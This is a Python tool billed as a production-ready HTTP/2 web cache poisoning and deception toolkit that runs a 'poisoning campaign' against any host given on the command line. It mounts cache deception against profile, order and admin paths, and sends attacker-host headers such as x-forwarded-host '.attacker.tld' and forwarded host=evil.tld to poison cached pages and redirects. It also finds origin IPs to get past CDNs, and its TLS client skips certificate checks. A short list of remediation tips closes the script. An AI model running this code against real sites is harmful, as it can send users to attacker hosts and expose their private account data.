#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HTTP/2 Web Cache Poisoning & Deception Toolkit (realistic, production-ready)
- Use robust HTTP/2 handshake with SNI/ALPN, SETTINGS/ACK, CONTINUATION handling.
- Implement practical, higher-hit web cache poisoning (WCP) techniques:
  • Header-based cache key pollution probes (X-Forwarded-*, X-Original-URL, Forwarded, etc.)
  • Web Cache Deception (WCD) via misleading static suffixes
  • Cache key normalization and path variant probes
  • Vary/UA split observation (not forging Vary; just exploiting splits)
"""

import asyncio
import ssl
import struct
import time
import json
import logging
import random
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
from enum import IntEnum
import hashlib

try:
    import hpack
except ImportError:
    raise SystemExit("hpack is required. pip install hpack")

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ==== HTTP/2 core types ====
class FrameType(IntEnum):
    DATA = 0x0
    HEADERS = 0x1
    PRIORITY = 0x2
    RST_STREAM = 0x3
    SETTINGS = 0x4
    PUSH_PROMISE = 0x5
    PING = 0x6
    GOAWAY = 0x7
    WINDOW_UPDATE = 0x8
    CONTINUATION = 0x9

class FrameFlag(IntEnum):
    END_STREAM = 0x1
    ACK = 0x1
    END_HEADERS = 0x4
    PADDED = 0x8
    PRIORITY = 0x20

SETTINGS_HEADER_TABLE_SIZE = 0x1
SETTINGS_ENABLE_PUSH = 0x2
SETTINGS_MAX_CONCURRENT_STREAMS = 0x3
SETTINGS_INITIAL_WINDOW_SIZE = 0x4
SETTINGS_MAX_FRAME_SIZE = 0x5
SETTINGS_MAX_HEADER_LIST_SIZE = 0x6

CONNECTION_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
DEFAULT_MAX_FRAME_SIZE = 16384

# ==== Data structures ====
@dataclass
class PoisonResult:
    attack_type: str
    success: bool
    details: Dict[str, Any]
    evidence: List[str]
    error: Optional[str] = None

# Simple HTTP/2 response container
@dataclass
class H2Response:
    status: Optional[int]
    headers: Dict[str, str]
    body: bytes
    raw_headers: List[Tuple[str, str]]

# ==== HTTP/2 Frame-Level Client for Server Push Attacks ====
# NOTE: This module retains frame-level HTTP/2 implementation for specialized 
# server push poisoning attacks that require precise frame control.
# For general HTTP/2 connectivity, use shared_protocol_client.py (httpx-based)
class H2Client:
    def __init__(self, host: str, port: int = 443, timeout: float = 10.0):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.encoder = hpack.Encoder()
        self.decoder = hpack.Decoder()
        self.stream_id = 1  # client-initiated odd IDs
        self.server_settings: Dict[int, int] = {}
        self.max_frame_size = DEFAULT_MAX_FRAME_SIZE

    def _next_stream_id(self) -> int:
        sid = self.stream_id
        self.stream_id += 2
        return sid

    async def connect(self, connect_host: Optional[str] = None) -> Tuple[asyncio.StreamReader, asyncio.StreamWriter]:
        context = ssl.create_default_context()
        # Security tradeoff: skip verification for scanning flexibility
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        context.set_alpn_protocols(['h2', 'http/1.1'])

        target = connect_host or self.host
        reader, writer = await asyncio.open_connection(
            target, self.port, ssl=context, server_hostname=self.host
        )

        ssl_obj = writer.get_extra_info('ssl_object')
        if not ssl_obj or ssl_obj.selected_alpn_protocol() != 'h2':
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass
            raise RuntimeError('HTTP/2 not negotiated via ALPN')

        # Send connection preface and initial SETTINGS
        writer.write(CONNECTION_PREFACE)
        writer.write(self._build_settings_frame({
            SETTINGS_HEADER_TABLE_SIZE: 0x4000,
            SETTINGS_MAX_HEADER_LIST_SIZE: 0x10000,
        }))
        await writer.drain()

        # Read server SETTINGS and send ACK
        await self._read_until_settings_and_ack(reader, writer)
        return reader, writer

    async def _read_until_settings_and_ack(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        # Wait for a SETTINGS from server, then ACK
        # Also capture MAX_FRAME_SIZE etc.
        while True:
            header = await reader.readexactly(9)
            length = int.from_bytes(b"\x00" + header[:3], 'big')
            ftype = header[3]
            flags = header[4]
            stream_id = int.from_bytes(header[5:9], 'big') & 0x7FFFFFFF
            payload = await reader.readexactly(length) if length else b''

            if ftype == FrameType.SETTINGS:
                if flags & FrameFlag.ACK:
                    # Server acked our SETTINGS – fine, continue reading until we see non-settings
                    continue
                # Parse and store settings
                for i in range(0, len(payload), 6):
                    sid = int.from_bytes(payload[i:i+2], 'big')
                    val = int.from_bytes(payload[i+2:i+6], 'big')
                    self.server_settings[sid] = val
                    if sid == SETTINGS_MAX_FRAME_SIZE:
                        self.max_frame_size = max(16384, min(val, 16777215))
                # Send ACK
                ack = self._frame(bytes(), FrameType.SETTINGS, FrameFlag.ACK, 0)
                writer.write(ack)
                await writer.drain()
                break
            elif ftype == FrameType.GOAWAY:
                raise RuntimeError('Received GOAWAY during handshake')
            # Ignore other frames at this stage

    def _frame(self, payload: bytes, ftype: int, flags: int, stream_id: int) -> bytes:
        length = len(payload).to_bytes(3, 'big')
        header = length + bytes([ftype, flags]) + (stream_id & 0x7FFFFFFF).to_bytes(4, 'big')
        return header + payload

    def _encode_headers_block(self, headers: List[Tuple[str, str]]) -> List[bytes]:
        # Encode with HPACK; segment into HEADERS + CONTINUATION blocks if needed
        block = self.encoder.encode(headers)
        if len(block) <= self.max_frame_size:
            return [block]
        chunks: List[bytes] = []
        start = 0
        while start < len(block):
            end = min(start + self.max_frame_size, len(block))
            chunks.append(block[start:end])
            start = end
        return chunks

    async def request(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter,
                      method: str, path: str, extra_headers: Optional[List[Tuple[str, str]]] = None,
                      body: Optional[bytes] = None, scheme: str = 'https') -> H2Response:
        sid = self._next_stream_id()
        headers: List[Tuple[str, str]] = [
            (':method', method),
            (':scheme', scheme),
            (':authority', self.host),
            (':path', path),
            ('accept', '*/*')
        ]
        if extra_headers:
            headers.extend(extra_headers)

        header_blocks = self._encode_headers_block(headers)
        # First block is HEADERS, subsequent are CONTINUATION
        first = True
        for i, blk in enumerate(header_blocks):
            if first:
                flags = 0
                if i == len(header_blocks) - 1 and body is None:
                    flags |= FrameFlag.END_HEADERS | FrameFlag.END_STREAM
                elif i == len(header_blocks) - 1:
                    flags |= FrameFlag.END_HEADERS
                frame = self._frame(blk, FrameType.HEADERS, flags, sid)
                writer.write(frame)
                first = False
            else:
                flags = FrameFlag.END_HEADERS if i == len(header_blocks) - 1 and body is None else 0
                frame = self._frame(blk, FrameType.CONTINUATION, flags, sid)
                writer.write(frame)
        await writer.drain()

        if body is not None:
            # send body in DATA, then END_STREAM
            data_flags = FrameFlag.END_STREAM
            writer.write(self._frame(body, FrameType.DATA, data_flags, sid))
            await writer.drain()

        # Read response for this stream_id
        return await self._read_response(reader, sid)

    async def _read_response(self, reader: asyncio.StreamReader, sid: int) -> H2Response:
        headers_block_parts: List[bytes] = []
        got_end_headers = False
        resp_headers: List[Tuple[str, str]] = []
        body = bytearray()
        status = None
        stream_closed = False

        # Read until END_STREAM on this sid
        while not stream_closed:
            header = await reader.read(9)
            if not header or len(header) < 9:
                break
            length = int.from_bytes(b"\x00" + header[:3], 'big')
            ftype = header[3]
            flags = header[4]
            rid = int.from_bytes(header[5:9], 'big') & 0x7FFFFFFF
            payload = await reader.read(length) if length else b''

            if rid != sid and rid != 0:
                # Ignore frames for other streams in this simple client
                continue

            if ftype == FrameType.HEADERS or ftype == FrameType.CONTINUATION:
                headers_block_parts.append(payload)
                if flags & FrameFlag.END_HEADERS:
                    block = b''.join(headers_block_parts)
                    headers_block_parts.clear()
                    got_end_headers = True
                    try:
                        decoded = self.decoder.decode(block)
                    except Exception as e:
                        logger.debug(f"HPACK decode failed: {e}")
                        decoded = []
                    resp_headers.extend((str(k), str(v)) for k, v in decoded)
                    # Extract status if present
                    for k, v in decoded:
                        if k == ':status':
                            try:
                                status = int(v)
                            except Exception:
                                status = None

                if flags & FrameFlag.END_STREAM:
                    stream_closed = True

            elif ftype == FrameType.DATA:
                body.extend(payload)
                if flags & FrameFlag.END_STREAM:
                    stream_closed = True

            elif ftype == FrameType.GOAWAY:
                stream_closed = True
            elif ftype == FrameType.RST_STREAM:
                stream_closed = True
            # ignore others

        # Collate headers into dict (last wins)
        hdict: Dict[str, str] = {}
        for k, v in resp_headers:
            hdict[k.lower()] = v

        return H2Response(status=status, headers=hdict, body=bytes(body), raw_headers=resp_headers)

    async def close(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        try:
            goaway_payload = (0).to_bytes(4, 'big') + (0).to_bytes(4, 'big')
            writer.write(self._frame(goaway_payload, FrameType.GOAWAY, 0, 0))
            await writer.drain()
        except Exception:
            pass
        try:
            writer.close()
            await writer.wait_closed()
        except Exception:
            pass

# ==== Attack Orchestrator ====
class H2PushPoisoning:
    """
    Realistic HTTP/2 Web Cache Poisoning orchestrator (no fake PUSH_PROMISE).
    """
    def __init__(self, target_host: str, target_port: int = 443, timeout: float = 10.0,
                 origin_candidates: Optional[List[str]] = None):
        self.target_host = target_host
        self.target_port = target_port
        self.timeout = timeout
        self.client = H2Client(target_host, target_port, timeout=timeout)
        self.origin_candidates = origin_candidates or []
        # Common User-Agents for split observation
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 Version/14.0 Mobile/15A372 Safari/604.1',
            'curl/8.4.0'
        ]

    async def run_poisoning_campaign(self) -> Dict[str, Any]:
        logger.info(f"Starting WCP campaign against {self.target_host}:{self.target_port}")
        results: Dict[str, Any] = {
            'target': f"{self.target_host}:{self.target_port}",
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'attacks': []
        }

        # Connectivity and cache probe
        connectivity = await self._probe_connectivity_and_cache()
        results['connectivity'] = connectivity

        # If any origin candidates available, validate them first
        if self.origin_candidates:
            origin_val = await self.validate_origin_candidates(self.origin_candidates)
            results['origin_validation'] = origin_val

        attack_funcs = [
            self.web_cache_deception,
            self.header_based_cache_pollution,
            self.cookie_unkeyed_poisoning,
            self.redirect_cache_poisoning,
            self.query_param_keying_probe,
            self.cache_key_normalization_probe,
            self.vary_split_observation,
        ]

        for func in attack_funcs:
            try:
                r = await func()
                results['attacks'].append(r.__dict__ if isinstance(r, PoisonResult) else r)
                if isinstance(r, PoisonResult) and r.success:
                    logger.info(f"✓ {r.attack_type} potential")
                else:
                    logger.info(f"• {getattr(r, 'attack_type', func.__name__)} done")
            except Exception as e:
                logger.error(f"Attack {func.__name__} failed: {e}")
                results['attacks'].append(PoisonResult(func.__name__, False, {}, [], str(e)).__dict__)

        # Impact summary
        results['summary'] = self._summarize(results)
        return results

    def _fingerprint_from_response(self, resp: H2Response) -> Dict[str, Any]:
        import re
        body_text = resp.body[:65536].decode('utf-8', errors='ignore')
        title = ''
        m = re.search(r'<title>(.*?)</title>', body_text, re.IGNORECASE | re.DOTALL)
        if m:
            title = m.group(1).strip()[:120]
        fp = {
            'status': resp.status,
            'server': resp.headers.get('server'),
            'content_length': len(resp.body),
            'body_hash': self._hash(resp.body),
            'title': title,
        }
        return fp

    async def _get_baseline_fingerprint(self, path: str = '/') -> Dict[str, Any]:
        reader, writer = await self.client.connect()
        resp = await self.client.request(reader, writer, 'GET', path)
        await self.client.close(reader, writer)
        return self._fingerprint_from_response(resp)

    async def _http1_fetch_fingerprint(self, connect_host: str, path: str = '/') -> Dict[str, Any]:
        """Minimal HTTP/1.1 TLS GET to IP with Host header as target, return basic fingerprint."""
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            context.set_alpn_protocols(['http/1.1'])
            reader, writer = await asyncio.open_connection(connect_host, self.target_port, ssl=context, server_hostname=self.target_host)
            req = f"GET {path} HTTP/1.1\r\nHost: {self.target_host}\r\nUser-Agent: cache-poison-probe/1.0\r\nAccept: */*\r\nConnection: close\r\n\r\n".encode()
            writer.write(req)
            await writer.drain()
            data = await reader.read(200000)
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass
            # crude parse
            headers, _, body = data.partition(b"\r\n\r\n")
            status = None
            server = None
            try:
                lines = headers.decode('iso-8859-1', errors='ignore').split('\r\n')
                if lines:
                    parts = lines[0].split()
                    if len(parts) >= 2 and parts[1].isdigit():
                        status = int(parts[1])
                for ln in lines[1:]:
                    if ln.lower().startswith('server:'):
                        server = ln.split(':', 1)[1].strip()
                        break
            except Exception:
                pass
            body_text = body[:65536].decode('utf-8', errors='ignore')
            import re
            m = re.search(r'<title>(.*?)</title>', body_text, re.IGNORECASE | re.DOTALL)
            title = m.group(1).strip()[:120] if m else ''
            return {
                'status': status,
                'server': server,
                'content_length': len(body),
                'body_hash': self._hash(body),
                'title': title
            }
        except Exception as e:
            return {'error': str(e)}

    async def validate_origin_candidates(self, candidates: List[str], path: str = '/') -> Dict[str, Any]:
        """Validate candidate origin IPs by direct connect + host override, compare to CDN baseline."""
        results: Dict[str, Any] = {'validated': [], 'failed': [], 'baseline': {}}
        try:
            baseline = await self._get_baseline_fingerprint(path)
            results['baseline'] = baseline
        except Exception as e:
            results['baseline_error'] = str(e)
            baseline = None
        for ip in candidates:
            entry: Dict[str, Any] = {'ip': ip}
            try:
                # Try HTTP/2 first
                reader, writer = await self.client.connect(connect_host=ip)
                resp = await self.client.request(reader, writer, 'GET', path)
                await self.client.close(reader, writer)
                fp = self._fingerprint_from_response(resp)
                entry['h2'] = fp
            except Exception as e:
                entry['h2_error'] = str(e)
                fp = None
            if not fp:
                # Fallback HTTP/1.1
                fp = await self._http1_fetch_fingerprint(ip, path)
                entry['http1'] = fp
            # Compare with baseline if available
            if baseline and isinstance(fp, dict) and fp.get('body_hash') and baseline.get('body_hash'):
                entry['match'] = (fp['body_hash'] == baseline['body_hash']) or (fp.get('title') and fp['title'] == baseline.get('title'))
                if entry['match']:
                    results['validated'].append(entry)
                else:
                    results['failed'].append(entry)
            else:
                results['failed'].append(entry)
        return results

    async def _probe_connectivity_and_cache(self) -> Dict[str, Any]:
        info: Dict[str, Any] = {'h2': False}
        try:
            reader, writer = await asyncio.wait_for(self.client.connect(), timeout=self.timeout)
            info['h2'] = True
            # random static path
            test_path = f"/cache-probe-{random.randint(1000,9999)}.txt"
            resp = await self.client.request(reader, writer, 'GET', test_path)
            info['server'] = resp.headers.get('server')
            info['cache_headers'] = {
                'cf-cache-status': resp.headers.get('cf-cache-status'),
                'x-cache': resp.headers.get('x-cache'),
                'x-cache-status': resp.headers.get('x-cache-status'),
                'x-varnish': resp.headers.get('x-varnish'),
                'age': resp.headers.get('age'),
                'via': resp.headers.get('via'),
                'x-served-by': resp.headers.get('x-served-by'),
                'x-backend': resp.headers.get('x-backend-server') or resp.headers.get('x-backend')
            }
            await self.client.close(reader, writer)
        except Exception as e:
            info['error'] = str(e)
        return info

    def _hash(self, data: bytes) -> str:
        if data is None:
            return '0'
        return hashlib.sha256(data).hexdigest()

    # === Attacks ===
    async def web_cache_deception(self) -> PoisonResult:
        """WCD: trick origin/CDN to cache sensitive content as static."""
        # Candidate deception bases; append a static-looking suffix
        bases = [
            '/api/user/profile', '/api/user/orders', '/account/settings', '/login', '/admin', '/graphql'
        ]
        suffixes = ['/style.css', '/image.png', '/script.js', '/static.css']
        evidence: List[str] = []
        try:
            reader, writer = await self.client.connect()
            for base in bases:
                for suf in suffixes:
                    path = f"{base}{suf}?cb={random.randint(1,1_000_000)}"
                    resp = await self.client.request(reader, writer, 'GET', path)
                    ctype = (resp.headers.get('content-type') or '').lower()
                    body_snip = resp.body[:256].decode('utf-8', errors='ignore')
                    # Heuristics: static suffix but non-static content or sensitive markers
                    suspicious = (
                        any(x in suf for x in ['.css', '.js', '.png']) and
                        (('json' in ctype) or ('text/html' in ctype) or ('application' in ctype and 'javascript' not in ctype and 'css' not in ctype))
                    )
                    sensitive_markers = ['email', 'token', 'password', 'session', 'graphql', 'user']
                    if suspicious or any(m in body_snip.lower() for m in sensitive_markers):
                        # Second fetch to see if cached (Age/X-Cache HIT)
                        resp2 = await self.client.request(reader, writer, 'GET', path)
                        age = resp2.headers.get('age')
                        xcache = resp2.headers.get('x-cache') or resp2.headers.get('x-cache-status') or resp2.headers.get('cf-cache-status')
                        evidence.append(f"WCD candidate {path} -> ctype={ctype}, age={age}, cache={xcache}")
                        await self.client.close(reader, writer)
                        return PoisonResult(
                            attack_type='web_cache_deception',
                            success=True,
                            details={'path': path, 'content_type': ctype, 'age': age, 'cache_header': xcache},
                            evidence=evidence
                        )
            await self.client.close(reader, writer)
            return PoisonResult('web_cache_deception', False, {}, evidence or ['no candidates found'])
        except Exception as e:
            return PoisonResult('web_cache_deception', False, {}, evidence, str(e))

    async def header_based_cache_pollution(self) -> PoisonResult:
        """Probe header-based cache key pollution (unkeyed trusted headers)."""
        probes = [
            [('x-forwarded-host', f"{self.target_host}.attacker.tld")],
            [('x-forwarded-proto', 'http')],
            [('x-forwarded-port', '80')],
            [('forwarded', 'host=evil.tld;proto=http')],
            [('x-original-url', '/admin')],
            [('x-rewrite-url', '/admin')],
            [('x-host', 'evil.tld')],
        ]
        evidence: List[str] = []
        try:
            reader, writer = await self.client.connect()
            test_path = '/'
            for extra in probes:
                hdrs = list(extra)
                resp1 = await self.client.request(reader, writer, 'GET', test_path, extra_headers=hdrs)
                # Look for reflections into Location/links or cache signals
                loc = resp1.headers.get('location')
                body_snip = resp1.body[:512].decode('utf-8', errors='ignore')
                cache_hdrs = {k: resp1.headers.get(k) for k in ['cf-cache-status', 'x-cache', 'x-cache-status', 'age']}
                hit_marker = any(cache_hdrs.values())
                reflected = False
                marker_host = (dict(hdrs).get('x-forwarded-host') or 'evil.tld').split(';')[0]
                if loc and ('evil' in loc or marker_host in loc):
                    reflected = True
                if not reflected and marker_host in body_snip:
                    reflected = True
                if reflected or hit_marker:
                    # second request to observe caching
                    resp2 = await self.client.request(reader, writer, 'GET', test_path, extra_headers=hdrs)
                    age2 = resp2.headers.get('age')
                    cf2 = resp2.headers.get('cf-cache-status') or resp2.headers.get('x-cache') or resp2.headers.get('x-cache-status')
                    evidence.append(f"Header {hdrs} influenced response, cache={cf2}, age={age2}")
                    await self.client.close(reader, writer)
                    return PoisonResult(
                        attack_type='header_based_cache_pollution',
                        success=True,
                        details={'headers': hdrs, 'age': age2, 'cache': cf2},
                        evidence=evidence
                    )
            await self.client.close(reader, writer)
            return PoisonResult('header_based_cache_pollution', False, {}, evidence or ['no reflections'])
        except Exception as e:
            return PoisonResult('header_based_cache_pollution', False, {}, evidence, str(e))

    async def cache_key_normalization_probe(self) -> PoisonResult:
        """Probe path normalization/case/semicolon params that split cache keys."""
        variants = [
            '/index', '/index/', '/index?.', '/index?x=1', '/INDEX', '/./index', '/a/../index', '/index;jsessionid=1'
        ]
        base = '/index'  # best-effort
        evidence: List[str] = []
        try:
            reader, writer = await self.client.connect()
            seen: Dict[str, Dict[str, Any]] = {}
            for p in variants:
                resp = await self.client.request(reader, writer, 'GET', p)
                sig = {
                    'status': resp.status,
                    'len': len(resp.body),
                    'cache': resp.headers.get('cf-cache-status') or resp.headers.get('x-cache') or resp.headers.get('x-cache-status'),
                    'age': resp.headers.get('age')
                }
                evidence.append(f"{p} -> {sig}")
                seen[p] = sig
            await self.client.close(reader, writer)
            # If same content length but different cache headers, likely split/merge issue exploitable
            lengths = {}
            for p, s in seen.items():
                if s['len']:
                    lengths.setdefault(s['len'], []).append((p, s))
            interesting = any(len(v) > 1 for v in lengths.values())
            return PoisonResult('cache_key_normalization_probe', interesting, {'samples': seen}, evidence)
        except Exception as e:
            return PoisonResult('cache_key_normalization_probe', False, {}, evidence, str(e))

    async def vary_split_observation(self) -> PoisonResult:
        """Observe cache splitting by UA/Lang (no forged Vary)."""
        path = '/'
        evidence: List[str] = []
        try:
            reader, writer = await self.client.connect()
            results = []
            for ua in self.user_agents:
                _ = await self.client.request(reader, writer, 'GET', path, extra_headers=[('user-agent', ua), ('accept-language', 'en')])
                await asyncio.sleep(0.25)
                resp2 = await self.client.request(reader, writer, 'GET', path, extra_headers=[('user-agent', ua), ('accept-language', 'en')])
                cache = resp2.headers.get('cf-cache-status') or resp2.headers.get('x-cache') or resp2.headers.get('x-cache-status')
                age = resp2.headers.get('age')
                results.append({'ua': ua[:32], 'cache': cache, 'age': age, 'status': resp2.status})
            await self.client.close(reader, writer)
            evidence.extend([f"{r['ua']} -> cache={r['cache']} age={r['age']} status={r['status']}" for r in results])
            # If some UAs hit cache and others miss consistently, split likely exists
            caches = [r['cache'] for r in results]
            split = len(set([c or 'NONE' for c in caches])) > 1
            return PoisonResult('vary_split_observation', split, {'observations': results}, evidence)
        except Exception as e:
            return PoisonResult('vary_split_observation', False, {}, evidence, str(e))

    async def cookie_unkeyed_poisoning(self) -> PoisonResult:
        """Attempt cookie-based unkeyed cache poisoning (classic WCP)."""
        candidates = ['/', '/index', '/home', '/api/config', '/status']
        marker_cookie = f"wcp_poison=admin_{random.randint(1,1_000_000)}"
        evidence: List[str] = []
        try:
            reader, writer = await self.client.connect()
            for path in candidates:
                # First request with cookie (potentially personalized)
                r1 = await self.client.request(reader, writer, 'GET', path, extra_headers=[('cookie', marker_cookie)])
                h1 = self._hash(r1.body)
                age1 = r1.headers.get('age')
                cache1 = r1.headers.get('cf-cache-status') or r1.headers.get('x-cache') or r1.headers.get('x-cache-status')
                # Second request without cookie (victim)
                r2 = await self.client.request(reader, writer, 'GET', path)
                h2 = self._hash(r2.body)
                age2 = r2.headers.get('age')
                cache2 = r2.headers.get('cf-cache-status') or r2.headers.get('x-cache') or r2.headers.get('x-cache-status')
                # Third to observe Age growth
                await asyncio.sleep(0.2)
                r3 = await self.client.request(reader, writer, 'GET', path)
                age3 = r3.headers.get('age')
                cache3 = r3.headers.get('cf-cache-status') or r3.headers.get('x-cache') or r3.headers.get('x-cache-status')
                evidence.append(f"{path} cookie-hit check: cookie_cache={cache1}, victim_cache={cache2}->{cache3}, ages={age1},{age2},{age3}")
                # If cookie variant leaked to non-cookie (same body hash) and shows caching signals
                if h1 == h2 and (cache2 or cache3 or (age2 and age3 and age2 != age3)):
                    await self.client.close(reader, writer)
                    return PoisonResult(
                        attack_type='cookie_unkeyed_poisoning',
                        success=True,
                        details={'path': path, 'age': [age1, age2, age3], 'cache': [cache1, cache2, cache3]},
                        evidence=evidence
                    )
            await self.client.close(reader, writer)
            return PoisonResult('cookie_unkeyed_poisoning', False, {}, evidence or ['no evidence of unkeyed cookie'])
        except Exception as e:
            return PoisonResult('cookie_unkeyed_poisoning', False, {}, evidence, str(e))

    async def redirect_cache_poisoning(self) -> PoisonResult:
        """Try to poison cached redirect via trusted header influence."""
        paths = ['/login', '/admin', '/account', '/']
        hdr_combo = [('x-forwarded-proto', 'http'), ('x-forwarded-host', 'evil.tld')]
        evidence: List[str] = []
        try:
            reader, writer = await self.client.connect()
            for p in paths:
                r1 = await self.client.request(reader, writer, 'GET', p, extra_headers=hdr_combo)
                loc1 = r1.headers.get('location')
                cache1 = r1.headers.get('cf-cache-status') or r1.headers.get('x-cache') or r1.headers.get('x-cache-status')
                if loc1 and ('evil' in loc1 or loc1.startswith('http://')):
                    # Victim request without headers
                    r2 = await self.client.request(reader, writer, 'GET', p)
                    loc2 = r2.headers.get('location')
                    cache2 = r2.headers.get('cf-cache-status') or r2.headers.get('x-cache') or r2.headers.get('x-cache-status')
                    age2 = r2.headers.get('age')
                    # Confirm persistence
                    r3 = await self.client.request(reader, writer, 'GET', p)
                    age3 = r3.headers.get('age')
                    evidence.append(f"{p} poisoned redirect? loc1={loc1} loc2={loc2} cache={cache1}->{cache2} age={age2}->{age3}")
                    if loc2 == loc1 and (cache2 or (age2 and age3 and age2 != age3)):
                        await self.client.close(reader, writer)
                        return PoisonResult('redirect_cache_poisoning', True, {'path': p, 'location': loc1, 'age': [age2, age3]}, evidence)
            await self.client.close(reader, writer)
            return PoisonResult('redirect_cache_poisoning', False, {}, evidence or ['no redirect poisoning observed'])
        except Exception as e:
            return PoisonResult('redirect_cache_poisoning', False, {}, evidence, str(e))

    async def query_param_keying_probe(self) -> PoisonResult:
        """Check if cache key ignores query parameters (dangerous global cache)."""
        base = '/'
        evidence: List[str] = []
        try:
            reader, writer = await self.client.connect()
            # Make two different query requests
            q1 = f"{base}?a={random.randint(1,1_000_000)}"
            q2 = f"{base}?b={random.randint(1,1_000_000)}"
            r0 = await self.client.request(reader, writer, 'GET', base)
            await asyncio.sleep(0.1)
            r1 = await self.client.request(reader, writer, 'GET', q1)
            await asyncio.sleep(0.1)
            r2 = await self.client.request(reader, writer, 'GET', q2)
            # Observe cache headers
            def cache_sig(r: H2Response) -> str:
                return r.headers.get('cf-cache-status') or r.headers.get('x-cache') or r.headers.get('x-cache-status') or ''
            sig0, sig1, sig2 = cache_sig(r0), cache_sig(r1), cache_sig(r2)
            age0, age1, age2 = r0.headers.get('age'), r1.headers.get('age'), r2.headers.get('age')
            # Hash comparison to detect key collapse
            h0, h1, h2 = self._hash(r0.body), self._hash(r1.body), self._hash(r2.body)
            evidence.append(f"base={sig0}/{age0} q1={sig1}/{age1} q2={sig2}/{age2} hashes={h0[:8]},{h1[:8]},{h2[:8]}")
            # If queries map to same cache object frequently (same hash as base or each other) and cache signals appear
            collapsed = ((h1 == h2 == h0) or (h1 == h2)) and any([sig0, sig1, sig2, age0, age1, age2])
            await self.client.close(reader, writer)
            return PoisonResult('query_param_keying_probe', bool(collapsed), {'base': base, 'q1': q1, 'q2': q2}, evidence)
        except Exception as e:
            return PoisonResult('query_param_keying_probe', False, {}, evidence, str(e))

    def _summarize(self, results: Dict[str, Any]) -> Dict[str, Any]:
        attacks = [a for a in results['attacks'] if isinstance(a, dict)]
        successes = [a for a in attacks if a.get('success')]
        summary = {
            'total_attacks': len(attacks),
            'successful': len(successes),
            'techniques': [a.get('attack_type') for a in successes],
            'recommendations': []
        }
        if successes:
            summary['recommendations'] = [
                'Purge CDN/edge caches for identified paths',
                'Harden cache key: include scheme/host/auth headers only from trusted proxies',
                'Disable caching for dynamic/API responses and mismatched content types',
                'Audit rewrite/original-url trust chains and WAF/proxy rules'
            ]
        else:
            summary['recommendations'] = [
                'Keep monitoring cache headers and origin behavior',
                'Ensure strict cache key construction, and disable caching of user-controlled inputs'
            ]
        return summary

# ==== CLI ====
async def main():
    import argparse
    parser = argparse.ArgumentParser(description='HTTP/2 Web Cache Poisoning & Deception Toolkit')
    parser.add_argument('host', help='Target hostname')
    parser.add_argument('--port', type=int, default=443, help='Target port')
    parser.add_argument('--timeout', type=float, default=10.0, help='Timeout seconds')
    parser.add_argument('--output', '-o', help='Write full JSON results to file')
    parser.add_argument('--candidate-ips', help='Comma-separated origin IP candidates to validate')
    parser.add_argument('--candidate-file', help='File with one candidate IP per line')
    args = parser.parse_args()

    print(' HTTP/2 Web Cache Poisoning & Deception Toolkit')
    print(f' Target: {args.host}:{args.port}')

    candidates: List[str] = []
    if args.candidate_ips:
        candidates.extend([x.strip() for x in args.candidate_ips.split(',') if x.strip()])
    if args.candidate_file:
        try:
            with open(args.candidate_file, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        candidates.append(line)
        except Exception as e:
            print(f"[!] failed to read candidate file: {e}")

    tool = H2PushPoisoning(args.host, args.port, timeout=args.timeout, origin_candidates=candidates)
    results = await tool.run_poisoning_campaign()

    summary = results.get('summary', {})
    print('\n SUMMARY:')
    print(f"   Total Attacks: {summary.get('total_attacks', 0)}")
    print(f"   Successful: {summary.get('successful', 0)}")
    print(f"   Techniques: {', '.join(summary.get('techniques', [])) or 'None'}")

    if args.output:
        with open(args.output, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False, default=str)
        print(f"\n Results written to: {args.output}")

if __name__ == "__main__":
    import sys
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    asyncio.run(main())
